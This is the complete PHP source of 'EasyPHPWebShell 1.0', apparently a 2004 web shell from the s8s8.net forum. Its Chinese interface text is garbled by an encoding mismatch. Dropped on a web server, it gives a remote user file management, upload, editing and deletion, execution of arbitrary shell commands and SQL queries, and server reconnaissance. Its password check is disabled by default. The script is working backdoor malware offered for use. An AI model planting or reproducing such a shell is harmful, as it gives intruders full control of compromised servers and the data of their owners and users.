
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8娴�璇�版)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, 瀹�浣�;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php
@set_time_limit(0);
@error_reporting(E_ERROR | E_WARNING | E_PARSE);
@ob_start();
$pagestarttime = microtime();

if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}

/////参�拌����缃�

$chkpassword = 0;//������������瀵�码楠�璇�

$my_password = "5065338";//璁剧疆瀵�码,濡�果chkpassword涓�0,姝ゅ��璁剧疆无效.

$cookit_time = 24;//璁剧疆cookie有效�堕��(单浣�:灏�时,娉�:涓�澶�24灏�时)

//////缁�束

?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8娴�璇�版)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, 瀹�浣�;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php

if($chkpassword == 1){
	@session_start();
	if ($_GET["action"] == "logout") {
		@session_unregister("smy_password");
		@session_destroy();
		@setcookie ("cmy_password","");
		echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
	}
	if($_GET["action"] == "login"){
		if($my_password==$_POST["pmy_password"]){
			@session_register("smy_password");
			$_SESSION["smy_password"] = $my_password;
			@setcookie ("cmy_password",$my_password,time()+(3600*$cookit_time));
			echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
		}
	}
	if (@session_is_registered("smy_password")||isset($_COOKIE["cmy_password"])){
		if (($_SESSION["smy_password"]!=$my_password)&&(!isset($_COOKIE["cmy_password"])||$_COOKIE["cmy_password"]!=$my_password))
			getloginpass();
	}else getloginpass();
}

if(!@get_cfg_var("register_globals")){
    foreach($_GET as $key => $val) $$key = $val;
    foreach($_POST as $key => $val) $$key = $val;
	foreach($_FILES as $key => $val) $$key = $val;
}

if(isset($df_path)){
    if (!file_exists($df_path)) $errordownload = "娌℃�惧�版��浠�"; 
    else {
        $df_name = basename($df_path);
        $df_fhd=fopen($df_path,"rb");
        if($df_fhd==false) $errordownload = "打寮�文浠堕��璇�";
        else{
            Header("Content-type: application/octet-stream");
            Header("Accept-Ranges: bytes");
            Header("Accept-Length: ".filesize($df_path));
            Header("Content-Disposition: attachment; filename=".$df_name);
            echo fread($df_fhd,filesize($df_path));
            fclose($df_fhd);
            exit;
        }
    } 
}

if(isset($gotodir)) if($gotodir != "") $dir=$gotodir;

if(!isset($action)) {
    $action = "dir";
    $dir = ".";
}

if(!isset($dir)) $dir = ".";

$rootdir = str_replace("\\\\","/",$_SERVER["DOCUMENT_ROOT"]);

if(isset($abspath)) $dir = gettruepath($dir);
else if(isset($unabspath)){
    $dir = gettruepath($dir);
    if(strstr($dir,$rootdir)) $dir = str_replace("$rootdir",".",$dir);  
    else $dir=".";
}
$rny="<font color=green><b>■</b></font>";$rnn="<font color=red><b>■</b></font>";

?>

<SCRIPT LANGUAGE="JavaScript">
function rusuredel(msg,url){
    smsg = "纭������瑕�删�ゆ��浠�(�������)[" + msg + "]吗?";
    if (confirm(smsg)){
        url = url + msg;
        window.location = url;
    } 
}

function rusurechk(msg,url){
    smsg = "婧�文浠�(�������,灞�性)涓�[" + msg + "],璇疯���ョ�������文浠�(�������,灞�性):";
    re = prompt(smsg,msg);
    if (re){
        url = url + re;
        window.location = url;
    }
}
</script>
</head>
<body>

<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" width="100%" bgcolor="#000000" class="stylebtext3">
            娆㈣��浣跨��EasyPHPWebShell 1.0(S8S8娴�璇�版)【切������ㄤ��浠讳��非娉�途寰��������后果�������】
        </td>
    </tr>
    <tr>
        <td align="center" bgcolor="#EEEEEE">
            �������浠剁��瀵硅矾寰�:<?php $stmp =str_replace("\\","/", __FILE__);echo "【<a href=\"$HTTP_SERVER_VARS[PHP_SELF]\">$stmp</a>】";?>【<a href="?action=logout">�规����娉ㄩ��浼�璇�</a>】
        </td>
    </tr>
    <tr>
        <td align="center"  bgcolor="#EEEEEE">【<a href="?action=dir&dir=.">文浠剁����理</a>】【<a href="?action=editfile&dir=<?=urlencode($dir);?>&editfile=<?=urlencode($dir);?>/">文�������杈�器</a>】【<a href="?action=sql">�版��������ヨ����</a>】【<a href="?action=shell">Shell�戒护</a>】【<a href="?action=env">�������变量</a>】【<a href="?action=phpinfo">PHP绯荤��淇℃��</a>】【<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">�ョ���存��</a>】
        </td>
    </tr>
</table>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="100%" bgcolor="#000000" align="center" class="stylebtext3">
<?php if($action == "dir"){?>
	文浠剁����理
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=dir&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;褰�前�������:&nbsp;
	<input name="gotodir" type="text" class="style1" value="<?=$dir?>" size="60">&nbsp;
	<input name="gotodirb" type="submit" class="style1" value="璺宠浆"><?php if($dir[1] == ':') echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&unabspath=1\">�规����用<b>�稿����</b>璺�������ョ��</a>】&nbsp;";else echo "【<a href=\"?action=dir&dir=".urlencode($dir)."&abspath=1\">�规����用<b>缁�瀵�</b>璺�������ョ��</a>】&nbsp;";?>
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=fileup&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;文浠朵��浼�到(�������):
	<input name="filedir" type="text" class="style1" value="<?=$dir?>" size="30">&nbsp;������版��浠�:
	<input name="userfile" type="file" class="style1" size="30">&nbsp;
	<input name="userfileb" type="submit" class="style1" value="涓�浼�">
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=filecreate&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;�板缓文浠�(�������)�ㄥ��前�������:&nbsp; 
	<input name="mkname" type="text" value="" size=30 class="style1">&nbsp;
	<input name="mkfileb" type="submit" value="�板缓文浠�" class="style1">&nbsp;
	<input name="mkdirb" type="submit" value="�板缓�������" class="style1">&nbsp;褰�前��������舵��:【<b><?php $write = "涓��������";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "�������";}}echo "$write</b>】";?>
	</td>
	</tr>
	</table>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr bgcolor="#000000" class="stylebtext3">
		<td width="25%">文浠跺��</td>
		<td width="40%">寤虹���堕��|最后淇�����规�堕��</td>
		<td width="10%">澶у��(KB)</td>
		<td width="8%">灞�性</td>
		<td width="17%">操浣�</td>
	</tr>
	<?php
	$filesum=0;$dirsum=0;$color="#EEEEEE";
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(@is_dir("$dir/$lop_fname")){
			$lop_fsize = "-";
			$lop_fcdata = "-";
			$lop_fmdata = "-";
			$lop_foper="-";
			$lop_ftype="-";
			if($lop_fname==".."){
				if($dir == ".") continue;
				$dirb=@dirname($dir);
				if($dir[1] ==':'){
					$dirb = gettruepath($dirb);
					if(strlen($dirb) <=3) $dirb = substr($dirb,0,2);
				}
				$bp="△ ";
				$lop_fname = "涓�绾х�������";
			}else if($lop_fname=="."){
				if($dir == ".") continue;
				$dir[1] ==':'?$dirb = substr(gettruepath($dirb),0,2):$dirb=$lop_fname;
				$bp="○ ";
				$lop_fname = "�圭骇�������";
			}else{
				$lop_fsize = "[DIR]";
				$dirb="$dir/$lop_fname";    
				$lop_fcdata = @date("Y-n-d H:i:s",@filectime("$dirb"));
				$lop_fmdata = @date("Y-n-d H:i:s",@filemtime("$dirb"));
				$lop_ftype= substr(@base_convert(@fileperms($dirb),10,8),-4);
				$bp="□ ";
				$title = "�瑰�昏���ユ��浠跺す[$lop_fname]";
				$lop_foper= "[<a href=\"删除\" title=\"删�ゆ�翠釜文浠跺す\" onClick=\"rusuredel('$dirb','?action=filedel&dir=$dir&deldir=');return false;\">删</a>|".
							"<a href=\"重�藉��\" title=\"重�藉��\" onClick=\"rusurechk('$dirb','?action=filerename&dir=$dir&renamef=$dirb&renamet=');return false;\">重</a>|".
							"<a href=\"�疯��\" title=\"�疯��\" onClick=\"rusurechk('$dirb','?action=filecopy&dir=$dir&copydirf=$dirb&copydirt=');return false;\">拷</a>|".
							"<a href=\"灞�性\" title=\"淇�����瑰��性\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&ctype=');return false;\">灞�</a>]";
				$dirsum++;
			}
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">$bp [<a href=\"?action=dir&dir=$dirb\" title = \"杩�入\">$lop_fname</a>]</td>".
							"<td width=\"40%\">[$lop_fcdata|$lop_fmdata]</td>".
							"<td width=\"10%\">$lop_fsize</td>".
							"<td width=\"8%\">$lop_ftype</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
		}
	}
	@closedir($dirs);
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(!@is_dir("$dir/$lop_fname")&&$lop_fname!=".."){
			$lop_ftype= substr(@base_convert(@fileperms("$dir/$lop_fname"),10,8),-4);
			$lop_foper= "[<a href=\"删除\" title=\"删除\" onClick=\"rusuredel('$dir/$lop_fname','?action=filedel&dir=$dir&delfile=');return false;\">删</a>|".
						"<a href=\"重�藉��\" title=\"重�藉��\"  onClick=\"rusurechk('$dir/$lop_fname','?action=filerename&dir=$dir&renamef=$dir/$lop_fname&renamet=');return false;\">重</a>|".
						"<a href=\"�疯��\" title=\"�疯��\" onClick=\"rusurechk('$dir/$lop_fname','?action=filecopy&dir=$dir&copyfilef=$dir/$lop_fname&copyfilet=');return false;\">拷</a>|".
						"<a href=\"灞�性\" title=\"淇�����瑰��性\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&cfile=$dir/$lop_fname&ctype=');return false;\">灞�</a>|".
						"<a href=\"?action=dir&df_path=$dir/$lop_fname\" title=\"涓�杞�\">涓�</a>|".
						"<a href=\"?action=editfile&dir=$dir&editfile=$dir/$lop_fname\" title=\"缂�杈�\">缂�</a>]";
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">■ <a href=\"$dir/$lop_fname\" title = \"�扮���ｄ腑打寮�\" target=\"_blank\">$lop_fname</a></td>".
							"<td width=\"40%\">[".@date("Y-n-d H:i:s",@filectime("$dir/$lop_fname"))."|".@date("Y-n-d H:i:s",@filemtime("$dir/$lop_fname"))."]</td>".
							"<td width=\"10%\">".@number_format(@filesize("$dir/$lop_fname")/1024,3)."</td>".
							"<td width=\"8%\">".$lop_ftype."</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
			$filesum++;
		}
	}
	@closedir($dirs);
	?>										  
	<tr bgcolor="#000000" class="stylebtext3" align="center">
		<td width="25%" colspan="5">�������数:<?=$dirsum?>,文浠舵��:<?=$filesum?></td>
	</tr>
	</table>      
<?php }else if ($action == "editfile"){?>
	文�������杈�器(�ョ�������文浠朵��瀛��ㄥ���板缓�版��浠�)
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=filesave&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">褰�前缂�杈�文浠跺��:
			<input name="editfilename" type="text" class="style1" value="<?=$editfile?>" size="30">
			<input name="editbackfile" type="checkbox" value="1" class="style1">生成澶�浠芥��浠�(原文浠�.bak)<br>
			<textarea name="editfiletext" cols="120" rows="25" class="style1"><?php 
				$fd = @fopen($editfile, "rb");
				$fd==false?$readfbuff = "璇诲��文浠堕��璇�(或灏����������取文浠�).":$readfbuff = @fread($fd, filesize($editfile));
				@fclose( $fd );
				$readfbuff = htmlspecialchars($readfbuff);
				echo "$readfbuff";
			?></textarea><p>
			<input name="editfileb" type="submit" value="提浜�" class="style1">&nbsp;&nbsp;
			<input name="editagainb" type="reset" value="重缃�" class="style1">
			<a href="?action=dir&dir=<?=urlencode($dir);?>">�规����杩�回文浠舵��瑙�椤甸��</a>
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("sql" == substr($action,0,3)){?>
	�版��������ヨ����
	</td>
	</tr>
	
	<tr>
	<form method="post" action="?action=sql" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			�版��������板��:<input name="sqlhost" type="text" class="style1" value="<?=isset($sqlhost)?$sqlhost:"localhost"?>" size="20">
			绔������:<input name="sqlport" type="text" class="style1" value="<?=isset($sqlport)?$sqlport:"3306"?>" size="5">
			�ㄦ�峰��:<input name="sqluser" type="text" class="style1" value="<?=isset($sqluser)?$sqluser:"root"?>" size="10">
			瀵�码:<input name="sqlpasd" type="text" class="style1" value="<?=isset($sqlpasd)?$sqlpasd:""?>" size="10">
			�版�������名:<input name="sqldb" type="text" class="style1" value="<?=isset($sqldb)?$sqldb:""?>" size="10"><br>
			<textarea name="sqlcmdtext" cols="120" rows="10" class="style1"><?php 
				if(!empty($sqlcmdtext)){
					@mysql_connect("{$sqlhost}:{$sqlport}","$sqluser","$sqlpasd") or die("�版�������杩��ュけ璐�");
					@mysql_select_db("$sqldb") or die("选�╂�版�������澶辫触");
					$res = @mysql_query("$sqlcmdtext");
					echo $sqlcmdtext;
					mysql_close();
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo isset($sqlcmdb)?($res?"�ц��成功.":"�ц��澶辫触:".mysql_error()):"";?></span><p>
			<input name="sqlcmdb" type="submit" value="�ц��" class="style1">&nbsp;&nbsp;
			<input name="sqlagainb" type="reset" value="重缃�" class="style1">
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("shell" == substr($action,0,5)){?>
	Shell�戒护
	</td>
	</tr>

	<tr>
		<form method="post" action="?action=shell" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			�芥��:<select name="seletefunc" class="input">
				<option value="system" <?=($seletefunc=="system")?"selected":"";?>>system</option>
				<option value="exec" <?=($seletefunc=="exec")?"selected":"";?>>exec</option>
				<option value="shell_exec" <?=($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
				<option value="passthru" <?=($seletefunc=="passthru")?"selected":"";?>>passthru</option>
				<option value="popen" <?=($seletefunc=="popen")?"selected":"";?>>popen</option>
			</select>
			�戒护:<input name="shellcmd" type="text" class="style1" value="<?=isset($shellcmd)?$shellcmd:""?>" size="80">
			<textarea name="shelltext" cols="120" rows="10" class="style1"><?php 
				if(!empty($shellcmd)){
					if($seletefunc=="popen"){
						$pp = popen($shellcmd, 'r');
						echo fread($pp, 2096);
						pclose($pp);
					}else{
						echo $out =  ("system"==$seletefunc)?system($shellcmd):(($seletefunc=="exec")?exec($shellcmd):(($seletefunc=="shell_exec")?shell_exec($shellcmd):(($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
					}
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo get_cfg_var("safe_mode")?"提绀�:瀹��ㄦā寮�涓�������芥��娉��ц��":"";?></span><p>
			<input name="shellcmdb" type="submit" value="�ц��" class="style1">&nbsp;&nbsp;
			<input name="shellagainb" type="reset" value="重缃�" class="style1">
			<p>
	</td>
	</form>
	</tr>
	</table>
<?php }else if($action=="phpinfo"){?>
	PHP绯荤��淇℃��
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2"><br><?php phpinfo();
		if(eregi("phpinfo",get_cfg_var("disable_functions"))) echo "<b>phpinfo�芥�拌����绂�姝�</b><br>";
	?><br>
	</td>
	</tr>
	</table>
<?php }else if("file" == substr($action,0,4)){?>
	绯荤��娑�息
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2">
	<br>
	<?php 
		if($action == "filesave"){
			if(isset($editfileb)&&isset($editfilename)){
				if(isset($editbackfile)&&($editbackfile == 1)) 
					echo $out = @copy($editfilename,$editfilename.".bak")?"生成澶�浠芥��浠舵��功.<p>":"生成澶�浠芥��浠舵��功<p>";
				$fd = @fopen($editfilename, "w");
				if($fd == false) echo "打寮�文浠�[$editfilename]错璇�.";
				else{
					echo $out=@fwrite($fd,$editfiletext)?"缂�杈�文浠�[$editfilename]成功!":"写�ユ��浠舵��浠�[$editfilename]错璇�";
					@fclose( $fd );
				}
			}
		}else if($action == "filedel"){
			if(isset($deldir)) {
				echo $out = file_exists($deldir)?(deltree($deldir)?"删�ょ�������[$deldir]成功!":"删�ょ�������[$deldir]澶辫触!"):"�������[$deldir]涓�瀛�在!!";
			}else if(isset($delfile)){
				@chmod("$delfile", 0777);
				echo $out = file_exists($delfile)?(@unlink($delfile)?"删�ゆ��浠�[$delfile]成功!":"删�ゆ��浠�[$delfile]澶辫触!"):"文浠�[$delfile]涓�瀛�在!";
			}
		}else if($action == "filerename"){
			echo $out = file_exists($renamef)?(@rename($renamef,$renamet)?"重�藉��[$renamef]涓�[{$renamet}]成功":"重�藉��[$renamef]涓�[{$renamet}]澶辫触"):"文浠�[$renamef]涓�瀛�在!";
		}else if($action =="filecopy") {
			if(isset($copydirf)&&isset($copydirt)){
				echo $out = file_exists($copydirf)?(truepath($copydirt)?(copydir($copydirf,$copydirt)?"�疯���������[$copydirf]到[$copydirt]成功":"�疯���������[$copydirf]到[$copydirt]澶辫触"):"��������������[$copydirt]涓�瀛��ㄤ��创寤洪��璇�"):"�������[$copydirf]涓�瀛�在!";
			}else if(isset($copyfilef)&&isset($copyfilet)){
				echo $out = file_exists($copyfilef)?(truepath(dirname($copyfilet))?(@copy($copyfilef,$copyfilet)?"�疯��文浠�[$copyfilef]到[$copyfilet]成功":"�疯��文浠�[$copyfilef]到[$copyfilet]澶辫触"):"��������������涓�瀛��ㄤ��创寤洪��璇�"):"婧�文浠�[$copyfilef]涓�瀛�在!";
			}
		}else if($action == "filecreate"){
			if(isset($mkdirb)){
				echo $out = file_exists("$dir/$mkname")?"[{$dir}/{$mkname}]璇ョ�������宸插��在":(@mkdir("$dir/$mkname",0777)?"�������[$mkname]创寤烘��功":"�������[$mkname]创寤哄け璐�");
			}else if(isset($mkfileb)){
				if(file_exists("$dir/$mkname")) echo "[$dir/$mkname]璇ユ��浠跺凡瀛�在";
				else{
					$fd = @fopen("$dir/$mkname", "w");
					if($fd == false) echo "寤虹��文浠�[$mkname]错璇�.";
					else{
						echo "寤虹��文浠�[$mkname]成功 <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($dir)."/".urlencode($mkname)."\"><p>�规����璺宠浆�ョ��杈�娴�瑙�椤甸��</a>";
						@fclose( $fd );
					}
				}
			}
		}else if($action == "filetype"){
			echo $out=@chmod($cfile,base_convert($ctype,8,10))?"�存�规��功!":"�存�瑰け璐�!";
		}else if($action == "fileup"){
			echo  $out = @copy($userfile["tmp_name"],"{$filedir}/{$userfile['name']}")?"涓�浼�文浠�[{$userfile['name']}]成功.浣�缃�:[{$filedir}/{$userfile['name']}]共({$userfile['size']})瀛�节.":"涓�浼�文浠�[{$userfile['name']}]澶辫触";
		}else{
			echo "错璇������提浜ゅ��数action.";
		}
	?>
	<p>
	<a href="?action=dir&dir=<?=urlencode($dir);?>">�规����杩�回文浠舵��瑙�椤甸��</a>
	<p>
	</td>
	</tr>
	</table>

<?php }else if($action=="env"){?>
	�������变量&nbsp;&nbsp;<?=$rny?>�������&nbsp;&nbsp;<?=$rnn?>涓��������<br>
	</td>
	</tr>
	<?php 
	$sinfo[0] = array("涓绘�哄��名:",$_SERVER["SERVER_NAME"]);
	$sinfo[1] = array("涓绘��IP:",gethostbyname($_SERVER["SERVER_NAME"]));
	$sinfo[2] = array("涓绘�虹����口:",$_SERVER["SERVER_PORT"]);
	$sinfo[3] = array("涓绘�烘�堕��:",date("Y/m/d_h:i:s",time()));
	$sinfo[4] = array("涓绘�虹郴缁�:",PHP_OS);
	$sinfo[5] = array("涓绘��WEB服�″��",$_SERVER["SERVER_SOFTWARE"]);
	$sinfo[6] = array("PHP版本:",PHP_VERSION);
	$sinfo[7] = array("�╀��绌洪��:",intval(diskfreespace(".") / (1024 * 1024).'MB'));
	$sinfo[8] = array("涓绘�鸿����瑷�",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$sinfo[9] = array("褰�前�ㄦ��",get_current_user());
	$sinfo[10] = array("最澶у��瀛�占用:",my_func("memory_limit",1));
	$sinfo[11] = array("最澶у��涓������浼�文浠�",my_func("upload_max_filesize",1));
	$sinfo[12] = array("POST最澶у����量",my_func("post_max_size",1));
	$sinfo[13] = array("脚�������时",my_func("max_execution_time",1));
	$sinfo[14] = array("灞��界���芥��",my_func("disable_functions",1));

	$ssql[0] = array("MYSQL",my_func("mysql_close",2)); 
	$ssql[1] = array("Oracle",my_func("ora_close",2)); 
	$ssql[2] = array("Oracle 8",my_func("OCILogOff",2)); 
	$ssql[3] = array("OBDC",my_func("odbc_close",2)); 
	$ssql[4] = array("SyBase",my_func("sybase_close",2)); 
	$ssql[5] = array("SQL_Server",my_func("mssql_close",2)); 
	$ssql[6] = array("DBase",my_func("dbase_close",2)); 
	$ssql[7] = array("Hyperwave",my_func("hw_close",2));
	$ssql[8] = array("Postgre_SQL",my_func("pg_close",2));

	$sobj[0] = array("Session�������",my_func("session_start",2));
	$sobj[1] = array("Socket�������",my_func("fsockopen",2));
	$sobj[2] = array("压缂╂��浠舵�������(Zlib)",my_func("gzclose",2));
	$sobj[3] = array("SMTP�������",my_func("smtp",2));
	$sobj[4] = array("XML�������",my_func("XML Support",3));
	$sobj[5] = array("FTP�������",my_func("FTP support",3));
	$sobj[6] = array("Sendmail�������",my_func("Internal Sendmail Support for Windows 4",3));
	$sobj[7] = array("SNMP�������",my_func("snmpget",2));
	$sobj[8] = array("PDF文妗ｆ�������",my_func("pdf_close",2));
	$sobj[9] = array("IMAP�靛�������欢�������",my_func("imap_close",2));
	$sobj[10] = array("�惧舰澶�理GD Library�������",my_func("imageline",2));
	$sobj[11] = array("ZEND�������",my_func("zend_version",2)."(".zend_version().")");

	$sobj[12] = array("允璁镐娇用URL打寮�文浠�",my_func("allow_url_fopen",2));
	$sobj[13] = array("PREL�稿����璇������ PCRE",my_func("preg_match",2));
	$sobj[14] = array("�剧ず错璇����俊息",my_func("display_errors",2));
	$sobj[15] = array("������ㄥ��涔��ㄥ��变量",my_func("register_globals",2));
	$sobj[16] = array("PHP杩�琛��瑰��",strtoupper(php_sapi_name()));
	?>

	<tr>
	<td align="center" bgcolor="#EEEEEE">
		<table width="600" border="0" cellpadding="0" cellspacing="0"><br>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">涓绘�轰俊息</td></tr>
			<?php 
			for($i=0;$i<15;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sinfo[$i][0]}</td><td>{$sinfo[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">�版��������������淇℃��</td></tr>
			<?php
			for($i=0;$i<9;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$ssql[$i][0]}</td><td>{$ssql[$i][1]}</td></tr>";		
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">缁�浠跺���朵��淇℃��</td></tr>
			<?php
			for($i=0;$i<17;$i++){
				$color=ch_color($color);
				echo "<tr bgcolor=\"$color\"><td>{$sobj[$i][0]}</td><td>{$sobj[$i][1]}</td></tr>";
			}
			?>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">�������涔��ョ��PHP配缃������数(澶�涓�������板�������","逗�烽��寮�)</td></tr>
			<tr bgcolor="#EEEEEE">
			<form method="post" action="?action=env" enctype="multipart/form-data">
				<td colspan="2">璇疯���ュ���扮��ProgId或ClassId:
					<input name="envname" type="text" size="50" class="style1" value=<?=isset($envname)?$envname:"";?>> 
					<input name="envnameb" type="submit" value="�ョ��" class="style1">
				</td>
			</form>
			</tr>
			<?php
				if(isset($envname)&&!empty($envname)){
					$envname=explode(",", $envname);
					$i=0;
					while($envname[$i]){
						echo "<tr bgcolor=\"#CCCCCC\"><td colspan=\"2\">�ヨ����[{$envname[$i]}]濡�涓�:</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_cfg_var�瑰��</td><td>". my_func($envname[$i],1)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>function_exists�瑰��</td><td>". my_func($envname[$i],2)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_gpc�瑰��</td><td>". my_func($envname[$i],3)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Get_magic_quotes_runtime�瑰��</td><td>". my_func($envname[$i],4)."</td></tr>";
						echo "<tr bgcolor=\"#EEEEEE\"><td>Getenv�瑰��</td><td>". my_func($envname[$i],5)."</td></tr>";	
						$i++;
					}
				}
			?>
		</table><br>
	</td>
	</tr>
	</table>
<?php }else{
	echo "错璇������提浜ゅ��数</td></tr><tr><td align=\"center\" bgcolor=\"#EEEEEE\"><br><a href=\"?action=dir&dir=".urlencode($dir)."\">�规����杩�回文浠舵��瑙�椤甸��</a><p></td></tr></table>";
}echoend();@ob_end_flush();?>

<?php

function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}

function deltree($TagDir){ 
	$mydir=@opendir($TagDir); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$TagDir/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$TagDir/$file")) return false;
		}else if(!is_dir("$TagDir/$file")){
			@chmod("$TagDir/$file", 0777);
			if(!@unlink("$TagDir/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$TagDir", 0777);
	if(!@rmdir($TagDir)) return false;
	return true;
}

function copydir($dirf,$dirt){
    $mydir=@opendir($dirf);
    while($file=@readdir($mydir)){
        if((is_dir("$dirf/$file")) && ($file!=".") && ($file!="..")) {
            if(!file_exists("$dirt/$file")) if(!@mkdir("$dirt/$file")) return false;
            if(!copydir("$dirf/$file","$dirt/$file")) return false;
        }else if(!is_dir("$dirf/$file")) if(!@copy("$dirf/$file","$dirt/$file")) return false;
    }
    return true;
}

function truepath($path){
	if(file_exists($path)) return true;	
	else{
		if(truepath(@dirname($path))){
			if(@mkdir($path)) return true;
			else return false;
		}else return false;
	}
}

function getpageruntime(){
    global $pagestarttime;
    $pagestarttime = explode(' ', $pagestarttime);
    $pageendtime = explode(' ',@microtime());
    return ($pageendtime[0]-$pagestarttime[0]+$pageendtime[1]-$pagestarttime[1]);
}

function echoend(){
    echo "<br><center>椤甸�㈡�ц���堕��:".getpageruntime()." 绉�<br>".
    "<span class = \"stylebtext2\">EasyPHPWebShell 1.0(S8S8娴�璇�版)</span><br>脚������� <b>缃�缁�技���������坛(<a href=\"http://www.s8s8.net\">http://www.s8s8.net</a>) ZV(<a href=\"mailto:zvrop@163.com\">zvrop@163.com</a>)</b> 缂�写<br>".
    "Copyright (C) 2004 www.s8s8.net All Rights Reserved.</center>";
}

function gettruepath($path){
    return str_replace("\\","/",@realpath($path));
}

function my_func($getname,$tp){
	global $rny, $rnn;
	$out = ($tp==1)?@get_cfg_var($getname):(($tp==2)?@function_exists($getname):(($tp==3)?@get_magic_quotes_gpc($getname):(($tp==4)?@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):"error!"))));
	return ($out == 1)?$rny:(($out == 0)?$rnn:$out);
}

function ch_color($c){
	return $c=="#CCCCCC"?"#EEEEEE":"#CCCCCC";
}

function getloginpass(){
	?>
	<br><br><br><br><br><br><br>
	<table align="center" width="300" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" bgcolor="#000000" class="stylebtext3">
            娆㈣��浣跨��,璇疯���ュ��码
        </td>
    </tr>
	<tr>
		<form method="post" action="?action=login" enctype="multipart/form-data">
        <td align="center" class="style1"><br>瀵�码
        <input name="pmy_password" type="password" size="30" class="style1"><p>
		<input name="pmy_passwordb" type="submit" value="  �婚��  " class="style1"><p>
        </td>
    </tr>
	</table>
	<?php
	exit;
}
?>
